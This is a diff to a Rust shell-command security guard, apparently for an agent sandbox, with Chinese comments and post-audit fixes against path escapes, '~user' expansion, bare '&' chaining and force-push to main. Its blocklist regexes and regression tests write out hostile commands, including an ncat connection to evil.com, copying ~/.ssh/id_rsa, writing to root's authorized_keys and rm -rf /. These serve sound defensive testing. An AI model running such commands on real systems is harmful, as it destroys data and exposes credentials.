@@ -15,7 +15,7 @@ use arc_swap::ArcSwap;
 use regex::Regex;
 use serde::{Deserialize, Serialize};
 use thiserror::Error;
-use tracing::debug;
+use tracing::{debug, warn};
 
 #[derive(Debug, Error)]
 pub enum SecurityError {
@@ -77,6 +77,14 @@ const SENSITIVE_PATHS: &[&str] = &[
 ];
 
 /// 命令白名单 — 二进制程序白名单 (argv[0] 校验)
+/// A-1: validate_argv 默认 arm — 公认只读无害二进制 (无专门 argv arm 但不改 fs/不执行任意命令/
+/// 不网络), 显式枚举走 Ok。其余白名单二进制 (解释器/构建链/SIGHUP extras) 走 warn 分支暴露校验缺口。
+/// 判据: 是否 "按设计就执行任意代码/联网/改文件系统" — 是则不列入 (交 seatbelt+UDS 纵深 + warn 日志)。
+const READONLY_NOARM_BINARY: &[&str] = &[
+    "ls", "echo", "pwd", "which", "file", "wc", "sort", "uniq", "stat", "du", "df", "tr", "cut",
+    "diff", "cmp", "fd", "exa", "true", "false", "test", "rmdir", "mkdir", "touch",
+];
+
 const WHITELIST: &[&str] = &[
     "python",
     "python3",
@@ -265,11 +273,32 @@ impl SecurityGuard {
         }
     }
 
-    /// 校验 cwd — 禁止敏感路径
+    /// 校验 cwd — 禁止敏感路径 / 禁止 .. 逃逸
     pub fn validate_cwd(&self, cwd: &str) -> SecurityVerdict {
+        // A-7: .. 逃逸嫌疑 — cwd 含 .. 组件拒绝 (绕过 cwd 边界)
+        if std::path::Path::new(cwd)
+            .components()
+            .any(|comp| comp == std::path::Component::ParentDir)
+        {
+            return SecurityVerdict::block(
+                format!("cwd 含 .. 组件, 拒绝逃逸嫌疑: {}", cwd),
+                SecurityStage::Regex,
+            );
+        }
+        // C-11: `~user` 用户名展开 — 视为可疑 (绕过 ~/.ssh 前缀, `~root`→敏感)
+        if is_tilde_user_form(cwd) {
+            return SecurityVerdict::block(
+                format!("cwd 为 ~user 用户名展开形式, 拒绝: {}", cwd),
+                SecurityStage::Regex,
+            );
+        }
         let expanded = expand_tilde(cwd);
         for (sens, sens_exp) in self.sensitive_paths.iter().zip(&self.sensitive_paths_exp) {
-            if &expanded == sens_exp || expanded.starts_with(&format!("{}/", sens_exp)) {
+            // P-3: 避免 format! 逐项分配 — 直接字节边界判断
+            if &expanded == sens_exp
+                || (expanded.starts_with(sens_exp)
+                    && expanded.as_bytes().get(sens_exp.len()) == Some(&b'/'))
+            {
                 return SecurityVerdict::block(
                     format!("cwd 位于敏感路径: {} (匹配 {})", cwd, sens),
                     SecurityStage::Regex,
@@ -333,6 +362,13 @@ impl SecurityGuard {
     fn check_redirect(&self, segment: &str) -> Option<String> {
         for cap in self.redirect_re.captures_iter(segment) {
             if let Some(target) = cap.get(1) {
+                // C-11: `~user` 重定向目标 — 视为可疑 (绕过 ~/.ssh 前缀, `~root`→敏感)
+                if is_tilde_user_form(target.as_str()) {
+                    return Some(format!(
+                        "重定向目标为 ~user 用户名展开形式, 拒绝: {}",
+                        target.as_str()
+                    ));
+                }
                 let expanded = expand_tilde(target.as_str());
                 for (sens, sens_exp) in self.sensitive_paths.iter().zip(&self.sensitive_paths_exp) {
                     if &expanded == sens_exp || expanded.starts_with(&format!("{}/", sens_exp)) {
@@ -342,6 +378,16 @@ impl SecurityGuard {
                             sens
                         ));
                     }
+                }
+                // C-12: .. 逃逸嫌疑 — 重定向目标含 .. 组件拒绝 (绕过 cwd 写敏感区)
+                if std::path::Path::new(target.as_str())
+                    .components()
+                    .any(|comp| comp == std::path::Component::ParentDir)
+                {
+                    return Some(format!(
+                        "重定向目标含 .. 组件, 拒绝逃逸嫌疑: {}",
+                        target.as_str()
+                    ));
                 }
             }
         }
@@ -357,14 +403,30 @@ impl SecurityGuard {
         // 企业多用户/Agent 驱动场景应叠加 seatbelt (C-SEC-02) + UDS 鉴权 (M-SEC-01) 纵深, 非此处封堵。
         // (拒绝 -c 会破坏沙箱测试机制 — 56 处测试依赖 python3 -c。)
         match binary {
+            // C-5: mv/cp 全非选项参数校验 — 旧版仅校验最后一个 (目地), 源参数可读 ~/.ssh/id_rsa
+            // 镜像 cat/grep 读源守卫: 敏感路径 + 敏感文件名 + .. 逃逸, 全非选项参数 (含源与目地)
             "mv" | "cp" => {
-                let dest = args
-                    .iter()
-                    .rev()
-                    .find(|a| !a.starts_with('-') && !a.starts_with('>'));
-                if let Some(dest) = dest {
-                    if self.is_sensitive_path(dest) {
-                        return Err(format!("{} 目的地位于敏感路径: {}", binary, dest));
+                for a in args.iter() {
+                    if a.starts_with('-') || a.starts_with('>') {
+                        continue;
+                    }
+                    if self.is_sensitive_path(a) {
+                        return Err(format!(
+                            "{} 参数位于敏感路径: {} (禁止触碰私钥/系统文件)",
+                            binary, a
+                        ));
+                    }
+                    if self.is_sensitive_filename(a) {
+                        return Err(format!(
+                            "{} 参数为凭据文件 (敏感文件名模式): {} (C-SEC-03)",
+                            binary, a
+                        ));
+                    }
+                    if std::path::Path::new(a)
+                        .components()
+                        .any(|comp| comp == std::path::Component::ParentDir)
+                    {
+                        return Err(format!("{} 路径含 .. 组件, 拒绝逃逸嫌疑: {}", binary, a));
                     }
                 }
                 Ok(())
@@ -459,18 +521,45 @@ impl SecurityGuard {
                 Ok(())
             }
             "git" => self.validate_git_argv(args),
-            _ => Ok(()),
+            // A-1: 默认 arm — 旧版 `_ => Ok(())` 对任何无专门 arm 的白名单二进制零 argv 校验,
+            // 新增白名单二进制 (SIGHUP extra / builder) 立获 "零校验" 待遇。Stage-2 whitelist 只校验
+            // 二进制名不校验参数, 危险在参数 (rm -rf 的危险在 -rf 不在 rm)。把 "未知" 当 "安全" 违反 fail-closed。
+            // 修正: 公认只读无害工具 (不改 fs/不执行任意命令/不网络) 显式枚举 → Ok;
+            // 其余 (含 SIGHUP extras) 记 warn 暴露 argv 校验缺口 → 仍 Ok (不破 trusted-caller 工具链,
+            // 真实威胁由 seatbelt C-SEC-02 + UDS 鉴权 M-SEC-01 纵深封堵, 见 C-SEC-03 边界注释)。
+            // warn 是 fail-loud 的 "log 证据" — 运维可见 extra 工具零校验, 决定是否加专门 arm 或叠加 seatbelt。
+            other => {
+                if READONLY_NOARM_BINARY.contains(&other) {
+                    Ok(())
+                } else {
+                    warn!(
+                        binary = other,
+                        argc = args.len(),
+                        "argv 校验缺口: 白名单二进制无专门 argv 守卫 (extra/toolchain); 依赖 seatbelt+UDS 鉴权纵深"
+                    );
+                    Ok(())
+                }
+            }
         }
     }
 
     /// 路径是否敏感 (含 ~ 展开) — 仅供内部 argv/cwd 校验复用
     fn is_sensitive_path(&self, path: &str) -> bool {
+        // C-11: 仅接受 `~` (家目录) 与 `~/...` 展开; `~user/...` (bash 用户名展开) 视为可疑
+        // 路径 — `~root/.ssh` 之类绕过 ~/.ssh 前缀匹配。无 `/` 时 (`~root` 裸) 同样拒绝。
+        if path.starts_with('~') && path != "~" && !path.starts_with("~/") {
+            return true;
+        }
         if !path.starts_with('/') && !path.starts_with('~') {
             return false;
         }
         let expanded = expand_tilde(path);
         for (_, sens_exp) in self.sensitive_paths.iter().zip(&self.sensitive_paths_exp) {
-            if &expanded == sens_exp || expanded.starts_with(&format!("{}/", sens_exp)) {
+            // P-3: 避免 format! 逐项分配 — 直接字节边界判断
+            if &expanded == sens_exp
+                || (expanded.starts_with(sens_exp)
+                    && expanded.as_bytes().get(sens_exp.len()) == Some(&b'/'))
+            {
                 return true;
             }
         }
@@ -496,8 +585,9 @@ impl SecurityGuard {
         suffixes.iter().any(|s| fname.ends_with(s))
     }
 
-    /// git 子命令约束 — C-SEC-02: 拒 config/-c/alias.*/core.*
+    /// git 子命令约束 — C-SEC-02: 拒 config/-c/alias.*/core.*; C-6: 拒 force-push 主分支
     fn validate_git_argv(&self, args: &[String]) -> Result<(), String> {
+        // C-SEC-02: 拒 config/-c/alias.*/core.* 持久/临时后门
         for a in args.iter() {
             if a == "config" {
                 return Err("禁止 git config 持久配置后门".into());
@@ -507,6 +597,19 @@ impl SecurityGuard {
             }
             if a.starts_with("alias.") || a.starts_with("core.") {
                 return Err("禁止 git config alias/core 持久后门".into());
+            }
+        }
+        // C-6: force-push 主分支 — 强制标志 (--force/-f/+) 与受保护分支名 (main/master/origin/*)
+        // 在 argv 任意位置出现即拒绝 (旧正则要求 --force 在 main 之前, `git push origin main --force` 绕过)
+        if args.iter().any(|a| a == "push") {
+            let has_force = args.iter().any(|a| {
+                a == "--force" || a == "-f" || a == "--force-with-lease" || a.starts_with('+')
+            });
+            let targets_main = args.iter().any(|a| {
+                a == "main" || a == "master" || a == "origin/main" || a == "origin/master"
+            });
+            if has_force && targets_main {
+                return Err("禁止 force-push 主分支 (main/master)".into());
             }
         }
         Ok(())
@@ -548,16 +651,21 @@ fn merge_whitelist(current: &ArcSwap<HashSet<String>>, extras: &[&str]) -> HashS
 /// 构建正则黑名单
 fn build_blocklist() -> Vec<(Regex, &'static str)> {
     let patterns: &[(&str, &str)] = &[
-        // 毁灭性删除
+        // 毁灭性删除 — L-4: 兼容拆分标志 (`rm -r -f /`) 与合并标志 (`rm -rf /`)
+        // 要求 rm 后任意位置出现 -r/--recursive 且 -f/--force, 再命中根/家目录
         (
-            r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*f?|-[a-zA-Z]*f[a-zA-Z]*r?)\s+(/|~|\$HOME|\*)",
+            r"rm\s+.*(-[a-zA-Z]*r[a-zA-Z]*f?|--recursive).*(/|~|\$HOME|\*)",
+            "rm -rf 毁灭性删除根/家目录",
+        ),
+        (
+            r"rm\s+.*(-[a-zA-Z]*f[a-zA-Z]*r?|--force).*(-[a-zA-Z]*r|--recursive).*(/|~|\$HOME|\*)",
             "rm -rf 毁灭性删除根/家目录",
         ),
         (r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/\s*$", "rm -rf 根目录"),
         (r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+~\s*$", "rm -rf 家目录"),
-        // 特权提升
+        // 特权提升 — L-5: su root 在 argv 任意位置 (`su - root` / `su root -`)
         (r"\bsudo\b", "禁止 sudo 特权提升"),
-        (r"\bsu\s+root\b", "禁止 su root 特权提升"),
+        (r"\bsu\b.*\broot\b", "禁止 su root 特权提升"),
         (r"\bdoas\b", "禁止 doas 特权提升"),
         // 磁盘格式化/擦除
         (
@@ -582,13 +690,14 @@ fn build_blocklist() -> Vec<(Regex, &'static str)> {
         (r">\s*/dev/disk", "禁止写入磁盘设备"),
         // fork bomb
         (r":\s*\(\)\s*\{\s*:\|:&\s*\}\s*;:", "禁止 fork bomb"),
-        // 受保护分支 force-push / reset —hard
+        // 受保护分支 force-push / reset —hard — C-6: 位置无关
+        // force 标志 (--force/-f/+) 与受保护分支名任意顺序; 双向覆盖
         (
-            r"git\s+push\b.*\s--force\b.*\s(origin/)?(main|master)",
+            r"git\s+push\b.*(--force|-f\b|\+\w)(origin/)?(main|master)",
             "禁止 force-push 主分支",
         ),
         (
-            r"git\s+push\s+-f\b.*\s(origin/)?(main|master)",
+            r"git\s+push\b.*(origin/)?(main|master).*(--force|-f\b)",
             "禁止 force-push 主分支",
         ),
         // M-SEC-08: git push origin +main force-push `+` 简写
@@ -681,6 +790,11 @@ fn split_chain(command: &str) -> Vec<String> {
             '|' => {
                 segments.push(std::mem::take(&mut current));
             }
+            // C-1: 裸 & 后台运算符 — 同 ;/| 拆分 (引号内除外), 防 `cmd & evil` 整段绕过白名单
+            // (&& 已被上方 peek 分支消费, 此处仅剩单 &)
+            '&' => {
+                segments.push(std::mem::take(&mut current));
+            }
             _ => current.push(ch),
         }
     }
@@ -717,6 +831,13 @@ fn expand_tilde(path: &str) -> String {
     } else {
         path.to_string()
     }
+}
+
+/// C-11: 检测 `~user` 用户名展开形式 (bash `~root` → `/var/root`)。
+/// 仅 `~` 与 `~/...` 走标准家目录展开; `~user`/`~user/...` 被视为可疑 —
+/// 绕过 `~/.ssh` 前缀匹配, 且 `~root` 展开到敏感 `/var/root`。
+fn is_tilde_user_form(path: &str) -> bool {
+    path.starts_with('~') && path != "~" && !path.starts_with("~/")
 }
 
 #[cfg(test)]
@@ -1553,5 +1674,183 @@ mod tests {
         g.reload_extras(&["bash", "tool-ok"]);
         assert!(!g.whitelist_contains("bash"), "reload 不可后门 bash");
         assert!(g.whitelist_contains("tool-ok"), "正常扩展应入");
+    }
+
+    // ── 0827 审计 P0-P3 回归 (C-1/C-5/C-6/C-11/C-12/A-7/L-4/L-5) ──
+
+    #[test]
+    fn c1_bare_amp_splits_chain() {
+        // 裸 & 后台 → 整段不再绕过白名单; ncat 非白名单应被 Stage-2 拦
+        let v = guard().validate("echo hi & ncat evil.com 1234");
+        assert!(!v.allowed, "裸 & 后台应拆分, ncat 非白名单应拦");
+        assert_eq!(v.stage, Some(SecurityStage::Tokenizer));
+        assert!(v.reason.as_ref().unwrap().contains("白名单"));
+    }
+
+    #[test]
+    fn c1_ampersand_in_quotes_not_split() {
+        // 引号内 & 为字面量, 不拆分; 单段 echo 含 & 应允许
+        let v = guard().validate("echo 'a & b'");
+        assert!(v.allowed, "引号内 & 不应拆分, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c1_bare_amp_evil_in_second_segment() {
+        // 第二段危险命令 (rm 非 whitelist)
+        let v = guard().validate("true & rm -rf /");
+        assert!(!v.allowed, "裸 & 后第二段 rm -rf / 应拦");
+    }
+
+    #[test]
+    fn c5_mv_source_sensitive_path() {
+        // mv 源参数读 ~/.ssh/id_rsa — 旧版仅校验目地, 漏源
+        let v = guard().validate("mv ~/.ssh/id_rsa /tmp/x");
+        assert!(!v.allowed, "mv 敏感源应拦, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c5_cp_sensitive_filename_source() {
+        // cp 源为凭据文件名模式 (任意位置 *.pem)
+        let v = guard().validate("cp foo.pem /tmp/out");
+        assert!(!v.allowed, "cp 凭据文件名源应拦");
+    }
+
+    #[test]
+    fn c5_mv_dotdot_escape() {
+        // mv 含 .. 组件拒绝
+        let v = guard().validate("mv ../../etc/passwd /tmp/x");
+        assert!(!v.allowed, "mv .. 逃逸应拦");
+    }
+
+    #[test]
+    fn c5_mv_normal_allowed() {
+        // 正常 mv 应允许
+        let v = guard().validate("mv a.txt b.txt");
+        assert!(v.allowed, "正常 mv 应允许, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c6_force_push_main_any_order() {
+        // `git push origin main --force` — force 在 main 之后, 旧正则漏
+        let v = guard().validate("git push origin main --force");
+        assert!(!v.allowed, "force-push 主分支任意顺序应拦");
+    }
+
+    #[test]
+    fn c6_force_push_short_flag_after() {
+        let v = guard().validate("git push origin master -f");
+        assert!(!v.allowed, "force-push -f 在 master 之后应拦");
+    }
+
+    #[test]
+    fn c6_force_push_nonmain_allowed() {
+        // force-push 普通分支不拦 (仅 main/master)
+        let v = guard().validate("git push --force origin feature-branch");
+        assert!(v.allowed, "force-push 普通分支不拦, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c11_tilde_user_cwd_rejected() {
+        // `~root` 用户名展开 cwd — 视为可疑
+        let v = guard().validate_cwd("~root");
+        assert!(!v.allowed, "~user cwd 应拒");
+    }
+
+    #[test]
+    fn c11_tilde_user_redirect_rejected() {
+        // `~root/x` 重定向目标 — 视为可疑
+        let v = guard().validate("echo hi > ~root/.ssh/authorized_keys");
+        assert!(!v.allowed, "~user 重定向应拒, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c11_normal_tilde_allowed() {
+        // `~/` 正常家目录展开不误伤
+        let v = guard().validate_cwd("~/projects");
+        assert!(v.allowed, "~/ 应允许, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn c12_redirect_dotdot_rejected() {
+        // 重定向目标含 .. 组件拒绝
+        let v = guard().validate("echo hi > ../escape.txt");
+        assert!(!v.allowed, "重定向 .. 应拒, reason={:?}", v.reason);
+    }
+
+    #[test]
+    fn a7_cwd_dotdot_rejected() {
+        let v = guard().validate_cwd("../escape");
+        assert!(!v.allowed, "cwd .. 应拒");
+    }
+
+    #[test]
+    fn l4_rm_split_flags_root() {
+        // `rm -r -f /` 拆分标志 — 旧正则漏 (要求合并 -rf)
+        let v = guard().validate("rm -r -f /");
+        assert!(!v.allowed, "rm 拆分标志根目录应拦");
+    }
+
+    #[test]
+    fn l4_rm_long_flags_root() {
+        // `rm --recursive --force /`
+        let v = guard().validate("rm --recursive --force /");
+        assert!(!v.allowed, "rm 长标志根目录应拦");
+    }
+
+    #[test]
+    fn l5_su_dash_root() {
+        // `su - root` — root 在 - 之后, 旧正则 `su\s+root` 漏
+        let v = guard().validate("su - root");
+        assert!(!v.allowed, "su - root 应拦");
+    }
+
+    #[test]
+    fn l5_su_root_trailing() {
+        // `su root -`
+        let v = guard().validate("su root -");
+        assert!(!v.allowed, "su root - 应拦");
+    }
+
+    // ── 0827 审计 A-1 回归 (validate_argv 默认 arm) ──
+
+    // A-1: 只读无害二进制 (ls) 无专门 arm → Ok (READONLY_NOARM_BINARY 静默放行)
+    #[test]
+    fn a1_readonly_noarm_binary_allowed() {
+        let v = guard().validate("ls -la /tmp");
+        assert!(v.allowed, "只读 ls 应允许, reason={:?}", v.reason);
+        assert_eq!(v.stage, None, "通过校验无拦截 stage");
+    }
+
+    // A-1: 工具链二进制 (cargo, 白名单内) 无专门 arm → warn 但 Ok (不破 trusted-caller 工具链)
+    // 真实威胁由 seatbelt C-SEC-02 + UDS 鉴权 M-SEC-01 纵深封堵, 非 argv 校验
+    #[test]
+    fn a1_toolchain_noarm_binary_warn_but_allowed() {
+        let v = guard().validate("cargo build --release");
+        assert!(
+            v.allowed,
+            "cargo 工具链应 warn 但 Ok (不破 trusted-caller), reason={:?}",
+            v.reason
+        );
+    }
+
+    // A-1: extra 白名单二进制 (SIGHUP 注入) 无专门 arm → warn 但 Ok
+    #[test]
+    fn a1_extra_whitelist_noarm_warn_but_allowed() {
+        let g = SecurityGuard::new().with_extra_whitelist(&["jq"]);
+        let v = g.validate("jq '.field' input.json");
+        assert!(
+            v.allowed,
+            "extra jq 应 warn 但 Ok (SIGHUP 注入工具链), reason={:?}",
+            v.reason
+        );
+    }
+
+    // A-1: READONLY_NOARM_BINARY 不含危险解释器 — 被拦截的是 Stage-1 regex / DENY_EXTEND, 非 argv arm
+    #[test]
+    fn a1_dangerous_interpreter_still_blocked_by_regex() {
+        // bash 在 DENY_EXTEND, 即使强行加 extra 也不入白名单 → Stage-2 拦
+        let g = SecurityGuard::new().with_extra_whitelist(&["bash"]);
+        let v = g.validate("bash -c 'rm -rf /'");
+        assert!(!v.allowed, "bash 不入白名单, 应被 Stage-2 拦");
     }
 }
